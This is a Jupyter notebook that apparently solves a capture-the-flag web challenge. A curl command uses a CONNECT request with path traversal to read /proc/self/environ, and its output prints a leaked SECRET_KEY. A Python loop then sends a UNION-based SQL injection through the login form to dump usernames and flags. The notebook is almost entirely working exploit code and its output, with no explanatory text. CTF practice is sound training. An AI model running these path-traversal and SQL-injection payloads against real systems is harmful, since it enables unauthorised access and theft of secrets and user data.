{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 10,
   "id": "7207a0fe-0fc6-4980-9302-e36d41471f9b",
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "import os"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "id": "011e2fd2-bf68-4a98-82bd-7bc5a5d664d5",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "PATH=/go/bin:/usr/local/go/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\u0000HOSTNAME=e3a0b567af8e\u0000SECRET_KEY=d2908c1de1cd896d90f09df7df67e1d4\u0000GOLANG_VERSION=1.17.2\u0000GOPATH=/go\u0000HOME=/root\u0000"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n",
      "                                 Dload  Upload   Total   Spent    Left  Speed\n",
      "  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0*   Trying 139.162.124.237:10001...\n",
      "* Connected to dvd.chal.h4ck3r.quest (139.162.124.237) port 10001 (#0)\n",
      "> CONNECT /static/login.css/../../../proc/self/environ HTTP/1.1\n",
      "> Host: dvd.chal.h4ck3r.quest:10001\n",
      "> User-Agent: curl/7.74.0\n",
      "> Accept: */*\n",
      "> \n",
      "* Mark bundle as not supporting multiuse\n",
      "< HTTP/1.1 200 OK\n",
      "< Content-Type: \n",
      "< Date: Sun, 30 Jan 2022 14:38:58 GMT\n",
      "< Content-Length: 202\n",
      "< \n",
      "{ [202 bytes data]\n",
      "100   202  100   202    0     0   1128      0 --:--:-- --:--:-- --:--:--  1122\n",
      "* Connection #0 to host dvd.chal.h4ck3r.quest left intact\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "0"
      ]
     },
     "execution_count": 11,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "os.system('curl --output - -v -X CONNECT --path-as-is http://dvd.chal.h4ck3r.quest:10001/static/login.css/../../../proc/self/environ')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "id": "b82156f6-49c6-4766-886a-48720ae61f79",
   "metadata": {},
   "outputs": [],
   "source": [
    "# SECRET_KEY=d2908c1de1cd896d90f09df7df67e1d4"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "id": "2abea632-3540-4191-8a94-9baf5b2ab4e5",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      " You don't have flag\n",
      "guest You don't have flag\n",
      "admin FL4GGG{Wow you found me but this is not flag}\n",
      "g8zMEs0Mu2w FL4GGG{Fake_flag}\n",
      "JvvgpmkSOBI FL4GGG{Fake_flag}\n",
      "wdH3DpnxHMQ FL4GGG{Fake_flag}\n",
      "AlUTw2PMYME FL4GGG{Fake_flag}\n",
      "q5sOhccqWTQ FL4GGG{Fake_flag}\n",
      "VM4DPxctQcA FL4GGG{Fake_flag}\n",
      "SEmxOajETWA FL4GGG{Fake_flag}\n",
      "Y3vxJHfQ0cg FL4GGG{Fake_flag}\n",
      "cbgIFSSVlIk FL4GGG{Fake_flag}\n",
      "BD3nh_VA89w FL4GGG{Fake_flag}\n",
      "87vr59kQVKA FL4GGG{Fake_flag}\n",
      "o1K5IsJzxF4 FL4GGG{Fake_flag}\n",
      "GcxwnpUVudc FL4GGG{Fake_flag}\n",
      "8dzgIbaOwos FL4GGG{Fake_flag}\n",
      "zgKBp3_y5lc FL4GGG{Fake_flag}\n",
      "CKUW9qv6H2U FL4GGG{Fake_flag}\n",
      "3NpyXQJRi94 FL4GGG{Fake_flag}\n",
      "Oj1XYWtrdGU FL4GGG{Fake_flag}\n",
      "lWAYhQWLBrQ FL4GGG{Fake_flag}\n",
      "KaDDur3Gf6Q FL4GGG{Fake_flag}\n",
      "nAitPQ4xxBo FL4GGG{Fake_flag}\n",
      "kngO9FICOKc FL4GGG{Fake_flag}\n",
      "TWTqlLwzf_I FL4GGG{Fake_flag}\n",
      "bTtmq-x5nfE FL4GGG{Fake_flag}\n",
      "7QfY6hhwqPU FL4GGG{Fake_flag}\n",
      "LhdcUfklNMU FL4GGG{Fake_flag}\n",
      "p5SNCwJpx_M FL4GGG{Fake_flag}\n",
      "A09i-4UGMVk FL4GGG{Fake_flag}\n",
      "uknILWuelFY FL4GGG{Fake_flag}\n",
      "PLqQUL27JVE FL4GGG{Fake_flag}\n",
      "QfyhS-WC6XQ FL4GGG{Fake_flag}\n",
      "Rs7O_Q2vMKA FL4GGG{Fake_flag}\n",
      "t-aiAXhsjpE FL4GGG{Fake_flag}\n",
      "mjUzY4NWMFo FL4GGG{Fake_flag}\n",
      "SrzAnl3A8Kk FL4GGG{Fake_flag}\n",
      "lmMafTUWoKc FL4GGG{Fake_flag}\n",
      "6quXg4c32CA FL4GGG{Fake_flag}\n",
      "SvMA-NLILfs FL4GGG{Fake_flag}\n",
      "3t8g5GiOegU FL4GGG{Fake_flag}\n",
      "vwYPcRokiYE FL4GGG{Fake_flag}\n",
      "QwLB230ULbs FL4GGG{Fake_flag}\n",
      "-_H7hgscs-U FL4GGG{Fake_flag}\n",
      "Amy_FghRVF8 FL4GGG{Fake_flag}\n",
      "S_shhDIyPc4 FL4GGG{Fake_flag}\n",
      "orrhY9s8tpg FL4GGG{Fake_flag}\n",
      "ylInlmm85t0 FL4GGG{Fake_flag}\n",
      "2MVGAZ05Uzc FL4GGG{Fake_flag}\n",
      "8XZCNUWRq-E FL4GGG{Fake_flag}\n",
      "bkG7czUzPtU FL4GGG{Fake_flag}\n",
      "55uM8OsRAfc FL4GGG{Fake_flag}\n",
      "LFVdMRrsA0w FL4GGG{Fake_flag}\n",
      "7Bz1daczXpE FL4GGG{Fake_flag}\n",
      "I4_-F08CY8Q FL4GGG{Fake_flag}\n",
      "47lLlivlgeI FL4GGG{Fake_flag}\n",
      "uBZBSHexLv4 FL4GGG{Fake_flag}\n",
      "lnz4po6R0mI FL4GGG{Fake_flag}\n",
      "A35wFHnQ4OM FL4GGG{Fake_flag}\n",
      "zz2C1ND8fxk FL4GGG{Fake_flag}\n",
      "i9hKEHmJVEQ FL4GGG{Fake_flag}\n",
      "R5UzeNP6fPk FL4GGG{Fake_flag}\n",
      "wa61oMTpt8w FL4GGG{Fake_flag}\n",
      "lYX2o0vZWvs FL4GGG{Fake_flag}\n",
      "UHfMHVk_OdE FL4GGG{Fake_flag}\n",
      "bPnBsZCVtBw FL4GGG{Fake_flag}\n",
      "ulZMP6YSF_8 FL4GGG{Fake_flag}\n",
      "1np3brT8VpM FL4GGG{Fake_flag}\n",
      "CB4kavxyFX8 FL4GGG{Fake_flag}\n",
      "uP5KGJXgeHA FL4GGG{Fake_flag}\n",
      "BM1dgVSxQkI FL4GGG{Fake_flag}\n",
      "pya6XoHjcjA FL4GGG{Fake_flag}\n",
      "y9mnCkTUeoI FL4GGG{Fake_flag}\n",
      "FWGEqUud52s FL4GGG{Fake_flag}\n",
      "rUGMtp9YDsQ FL4GGG{Fake_flag}\n",
      "HXZPSr-_AZA FL4GGG{Fake_flag}\n",
      "hvBCMo8TJ9A FL4GGG{Fake_flag}\n",
      "KlhG4Cn92Pk FL4GGG{Fake_flag}\n",
      "ivvpIkn13eg FL4GGG{Fake_flag}\n",
      "YGXJjO1b94Q FL4GGG{Fake_flag}\n",
      "5SFhxi5Q75g FL4GGG{Fake_flag}\n",
      "o9VobxVeSWk FL4GGG{Fake_flag}\n",
      "WedNK9i4ahY FL4GGG{Fake_flag}\n",
      "mbrF96SoHgs FL4GGG{Fake_flag}\n",
      "WnnDvpvVuhU FL4GGG{Fake_flag}\n",
      "5M2ls1vrgJI FL4GGG{Fake_flag}\n",
      "Y-7wDxHAnE0 FL4GGG{Fake_flag}\n",
      "aiHG3Dugwwo FL4GGG{Fake_flag}\n",
      "zgWo7FyNsXc FL4GGG{Fake_flag}\n",
      "tG1NxnAGl54 FL4GGG{Fake_flag}\n",
      "VM4DPxctQcA FLAG{WOW_I_am_the_real_flag____MEOWWWW}\n",
      "ghGOe1aYO7w FL4GGG{Fake_flag}\n",
      "TEvjNVgjRtc FL4GGG{Fake_flag}\n",
      "IhHw20EHn1s FL4GGG{Fake_flag}\n",
      "gCHsIEmtOiY FL4GGG{Fake_flag}\n",
      "w1j1cXLJqeo FL4GGG{Fake_flag}\n",
      "x45Dd05q-FA FL4GGG{Fake_flag}\n",
      "F1txzg2bVRc FL4GGG{Fake_flag}\n",
      "jWoOG98fc5c FL4GGG{Fake_flag}\n"
     ]
    }
   ],
   "source": [
    "s = requests.Session()\n",
    "\n",
    "for i in range(100):\n",
    "    r = s.post('http://localhost:10001/login', data={\n",
    "        \"username\": f\"' UNION SELECT username, flag FROM users WHERE uid={i}#\",\n",
    "        \"password\": \"\"\n",
    "    })\n",
    "    r = requests.get(\"http://dvd.chal.h4ck3r.quest:10001\", cookies={\"session\": s.cookies['session']})\n",
    "    username = r.text.split(\"\\n\")[-12].split(\"Hi, \")[1].split(\"</h1>\")[0].strip()\n",
    "    flag = r.text.split(\"\\n\")[-7].strip()\n",
    "    print(username, flag)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.9"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
